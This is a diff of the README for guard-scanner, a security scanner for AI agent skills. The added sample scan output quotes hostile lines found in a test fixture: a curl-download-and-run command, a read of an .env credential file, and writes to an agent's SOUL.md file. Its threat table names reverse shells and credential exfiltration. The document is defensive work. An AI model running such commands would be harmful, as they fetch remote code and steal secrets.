@@ -1,16 +1,25 @@
 # guard-scanner 🛡️
 
-Static + runtime security scanner for AI agent skills.
-**135 static patterns + 26 runtime checks** across **22 threat categories** — zero dependencies.
+*The Original, Zero-Dependency Shield for the AI Agent Era.*
 
-[![npm](https://img.shields.io/npm/v/guard-scanner)](https://www.npmjs.com/package/guard-scanner)
-[![license](https://img.shields.io/npm/l/guard-scanner)](LICENSE)
+As autonomous AI agents become more prevalent, the risk of executing untrusted or malicious skills increases. **guard-scanner** is an open-source, zero-dependency static and runtime security scanner designed to help protect developers' local machines from Prompt Injections, RCEs, and Memory Poisoning.
+
+Built collaboratively by the **[Guava Parity Institute](https://github.com/koatora20)** and the open-source community. We believe that AI safety infrastructure should be a shared, transparent, and accessible resource for everyone. We welcome contributions, feedback, and discussion from all developers!
+
+**144+ static patterns + 26 runtime checks** across **22 threat categories**.
+
+[![npm](https://img.shields.io/npm/v/@guava-parity/guard-scanner)](https://www.npmjs.com/package/@guava-parity/guard-scanner)
+[![license](https://img.shields.io/npm/l/@guava-parity/guard-scanner)](LICENSE)
 
 ## Install
 
 ```bash
-npm install -g guard-scanner
+npm install -g @guava-parity/guard-scanner
 ```
+
+> **Why use this?** If you are experimenting with third-party skills for your AI agents, `guard-scanner` acts as a basic safety net, helping to identify hidden prompts or dangerous execution patterns.
+> 
+> 🤝 **We need your help!**: The landscape of Agentic AI threats is evolving rapidly. We are maintaining this project out of goodwill to provide a baseline defense, but we rely on community contributions to keep our pattern database updated. If you find a false positive or a new threat vector, please consider opening an issue or a pull request!
 
 ## Quick Start
 
@@ -24,6 +33,57 @@ guard-scanner ./skills/ --strict --json --sarif --fail-on-findings
 # CI/CD pipeline (stdout)
 guard-scanner ./skills/ --format sarif --quiet | upload-sarif
 ```
+
+## 🔍 Example Scan Output
+
+This is actual output from scanning a malicious test skill demonstrating data exfiltration, memory poisoning, and credential theft:
+
+```console
+$ guard-scanner ./test/fixtures/malicious-skill/ --verbose
+
+🛡️  guard-scanner v4.0.1
+══════════════════════════════════════════════════════
+📂 Scanning: ./test/fixtures/malicious-skill/
+📦 Skills found: 1
+
+🔴 scripts — MALICIOUS (risk: 100)
+   📁 exfiltration
+      🔴 [HIGH] Suspicious domain: webhook.site — evil.js
+   📁 malicious-code
+      🔴 [HIGH] eval() call — evil.js:18
+      💀 [CRITICAL] Shell download/execution — stealer.js:19
+         └─ "exec(`curl https://91.92.242.30/payload -o /tmp/x && bash"
+   📁 credential-handling
+      🔴 [HIGH] Credential file read — evil.js:6
+         └─ "readFileSync('.env"
+      💀 [CRITICAL] Agent identity file read — evil.js:7
+         └─ "readFileSync('SOUL.md"
+   📁 memory-poisoning
+      💀 [CRITICAL] Write to agent soul file — evil.js:21
+         └─ "writeFileSync('SOUL.md"
+   📁 data-flow
+      💀 [CRITICAL] Data flow: secret read (L6) → network call (L10) — evil.js:6
+
+══════════════════════════════════════════════════════
+📊 guard-scanner Scan Summary
+──────────────────────────────────────────────────────
+   Scanned:      1
+   🟢 Clean:       0
+   🔴 Malicious:   1
+   Safety Rate:  0%
+══════════════════════════════════════════════════════
+⚠️  CRITICAL: 1 malicious skill(s) detected!
+```
+
+## 🚀 Standalone Architecture
+
+**guard-scanner** is designed as a foundational "Shield" for the OpenClaw ecosystem. 
+It features a **Standalone Boot Sequence**:
+- **Zero API/DB Dependencies**: It initializes purely from local, static Threat Patterns (144+ regex rules) defined in its codebase.
+- **No Heavy Context Loading**: It does *not* require loading heavy memory databases or executing contextual commands.
+- **Privacy First**: It never accesses or exposes your agent's private memory during the boot phase.
+
+This lightweight initialization makes it perfect for zero-trust environments, ensuring complete safety without exposing proprietary agent logic.
 
 ## Options
 
@@ -83,7 +143,7 @@ Real-time `before_tool_call` hook that blocks dangerous operations.
 | 1 | Threat Detection | Reverse shell, curl\|bash, SSRF, credential exfil |
 | 2 | Trust Defense | SOUL.md tampering, memory injection |
 | 3 | Safety Judge | Prompt injection in tool args, trust bypass |
-| 4 | Brain | No-research execution |
+| 4 | Behavioral | No-research execution |
 | 5 | Trust Exploitation (ASI09) | Authority claim, creator bypass, fake audit |
 
 ```bash
@@ -93,6 +153,8 @@ openclaw hooks enable guard-scanner
 ```
 
 Modes: `monitor` (log only) / `enforce` (block CRITICAL) / `strict` (block HIGH+CRITICAL)
+
+
 
 ## OWASP Mapping
 
@@ -172,6 +234,16 @@ guard-scanner ./skills/ --rules ./my-rules.json
 - **SARIF 2.1.0** — GitHub Code Scanning / CI/CD (`--sarif`)
 - **HTML** — Visual dashboard (`--html`)
 - **stdout** — Pipeable output (`--format json|sarif --quiet`)
+
+## Contributing
+
+We wholeheartedly welcome contributions! Guard-scanner is built on community knowledge. 
+
+Whether you're fixing a bug, adding a new threat pattern, or simply improving the documentation, your help is deeply appreciated. Please see our [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to get started.
+
+## Code of Conduct
+
+We are committed to fostering a welcoming, respectful, and harassment-free environment. Please read our [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) before participating in our community.
 
 ## License
 
